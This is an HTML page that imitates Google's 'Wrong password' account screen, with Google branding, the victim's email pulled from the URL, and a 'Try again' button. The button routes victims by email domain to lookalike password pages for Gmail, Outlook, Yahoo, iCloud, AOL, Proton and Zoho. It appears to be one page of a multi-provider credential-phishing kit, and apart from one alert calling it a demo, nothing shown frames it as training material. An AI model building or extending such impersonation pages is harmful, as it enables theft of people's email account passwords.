<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wrong password - Google Account</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 24px;
            color: #202124;
        }

        .card {
            width: 100%;
            max-width: 448px;
            background: #ffffff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            text-align: center;
            min-height: 500px;
        }

        .google-logo {
            width: 75px;
            height: auto;
            margin-bottom: 20px;
        }

        /* Big red error icon above the heading */
        .error-icon {
            width: 48px;
            height: 48px;
            margin: 0 auto 20px;
            display: block;
        }

        .heading {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 12px;
        }

        .subheading {
            font-size: 15px;
            color: #5f6368;
            line-height: 1.5;
            margin-bottom: 32px;
            max-width: 360px;
            margin-left: auto;
            margin-right: auto;
        }

        .subheading strong {
            color: #202124;
            font-weight: 500;
            word-break: break-all;
        }

        /* Account chip below the message */
        .account-chip {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            border: 1px solid #dadce0;
            border-radius: 16px;
            padding: 6px 12px 6px 6px;
            font-size: 14px;
            color: #3c4043;
            margin-bottom: 32px;
            cursor: pointer;
            transition: background 0.15s ease;
            max-width: 100%;
        }

        .account-chip:hover {
            background: #f6f8fa;
        }

        .account-chip .avatar {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #1a73e8;
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 600;
            flex-shrink: 0;
            text-transform: uppercase;
        }

        .account-chip .email-text {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .account-chip .chevron {
            width: 16px;
            height: 16px;
            flex-shrink: 0;
            color: #5f6368;
        }

        /* Troubleshooting tips list */
        .tips {
            text-align: left;
            background: #f8f9fa;
            border-radius: 8px;
            padding: 16px 20px;
            margin-bottom: 32px;
            font-size: 14px;
            color: #3c4043;
            line-height: 1.6;
        }

        .tips .tips-title {
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
            font-size: 14px;
        }

        .tips ul {
            list-style: none;
            padding-left: 0;
        }

        .tips li {
            position: relative;
            padding-left: 18px;
            margin-bottom: 4px;
        }

        .tips li::before {
            content: "•";
            position: absolute;
            left: 4px;
            color: #5f6368;
        }

        /* Actions */
        .actions {
            display: flex;
            flex-direction: column;
            gap: 12px;
            align-items: stretch;
        }

        .try-again-btn {
            width: 100%;
            background: #1a73e8;
            color: #ffffff;
            font-size: 14px;
            font-weight: 500;
            border: none;
            border-radius: 4px;
            padding: 12px 24px;
            cursor: pointer;
            font-family: inherit;
            transition: background 0.15s ease;
        }

        .try-again-btn:hover {
            background: #1765cc;
        }

        .forgot-link {
            font-size: 14px;
            font-weight: 500;
            color: #1a73e8;
            text-decoration: none;
            background: none;
            border: none;
            cursor: pointer;
            font-family: inherit;
            padding: 8px 8px;
            border-radius: 4px;
        }

        .forgot-link:hover {
            background: #f6f8fa;
        }

        .footer-lang {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 48px;
            font-size: 12px;
            color: #5f6368;
        }

        .footer-lang select {
            background: none;
            border: none;
            font-size: 12px;
            color: #5f6368;
            cursor: pointer;
            padding: 4px;
        }

        .footer-links {
            display: flex;
            gap: 16px;
            margin-top: 8px;
            font-size: 12px;
            color: #5f6368;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .card {
                border: none;
                padding: 24px 0;
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="card">
        <svg class="google-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
        </svg>

        <!-- Big red error icon -->
        <svg class="error-icon" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
            <circle cx="24" cy="24" r="20" fill="#d93025"/>
            <line x1="24" y1="14" x2="24" y2="27" stroke="#ffffff" stroke-width="3" stroke-linecap="round"/>
            <circle cx="24" cy="33" r="2" fill="#ffffff"/>
        </svg>

        <h1 class="heading">Wrong password</h1>
        <p class="subheading">
            The password you entered for <strong id="displayEmail">your account</strong> is incorrect. Please try again.
        </p>

        <div class="account-chip" id="accountChip">
            <span class="avatar" id="avatarLetter">A</span>
            <span class="email-text" id="chipEmail">loading...</span>
            <svg class="chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </div>

        <div class="tips">
            <div class="tips-title">Need help?</div>
            <ul>
                <li>Check that Caps Lock is off</li>
                <li>Make sure your keyboard language is correct</li>
                <li>Try typing your password in a text editor first</li>
                <li>Use "Forgot password" if you don't remember it</li>
            </ul>
        </div>

        <div class="actions">
            <button class="try-again-btn" id="tryAgainBtn" type="button">Try again</button>
            <button class="forgot-link" id="forgotLink" type="button">Forgot password?</button>
        </div>

        <div class="footer-lang">
            <select aria-label="Change language">
                <option>English (United States)</option>
                <option>Français (Canada)</option>
                <option>Español</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        // ---- Read the email from the URL query string ----
        const params = new URLSearchParams(window.location.search);
        const rawEmail = params.get('email') || '';
        const email = rawEmail.trim().toLowerCase();

        // If no email was passed, send the user back to email.html
        if (!email) {
            window.location.replace('email.html');
        }

        // ---- Populate the email displays ----
        const displayEmail = document.getElementById('displayEmail');
        const chipEmail = document.getElementById('chipEmail');
        const avatarLetter = document.getElementById('avatarLetter');

        displayEmail.textContent = email;
        chipEmail.textContent = email;
        avatarLetter.textContent = email.charAt(0).toUpperCase();

        // ---- Try again: return to the correct password page based on domain ----
        const tryAgainBtn = document.getElementById('tryAgainBtn');

        function getPasswordPage(domain) {
            const domainMap = {
                'gmail.com': 'gmail.html',
                'googlemail.com': 'gmail.html',
                'outlook.com': 'outlook.html',
                'hotmail.com': 'outlook.html',
                'live.com': 'outlook.html',
                'msn.com': 'outlook.html',
                'yahoo.com': 'yahoo.html',
                'ymail.com': 'yahoo.html',
                'icloud.com': 'icloud.html',
                'me.com': 'icloud.html',
                'mac.com': 'icloud.html',
                'aol.com': 'aol.html',
                'protonmail.com': 'proton.html',
                'proton.me': 'proton.html',
                'zoho.com': 'zoho.html'
            };
            return domainMap[domain] || 'gmail.html';
        }

        tryAgainBtn.addEventListener('click', () => {
            const domain = email.split('@')[1];
            const page = getPasswordPage(domain);
            window.location.href = page + '?email=' + encodeURIComponent(email);
        });

        // ---- Forgot password: no-op for now ----
        document.getElementById('forgotLink').addEventListener('click', () => {
            alert('Password reset is not available in this demo.');
        });

        // ---- Account chip: return to email.html ----
        document.getElementById('accountChip').addEventListener('click', () => {
            window.location.href = 'email.html';
        });
    </script>
</body>
</html>
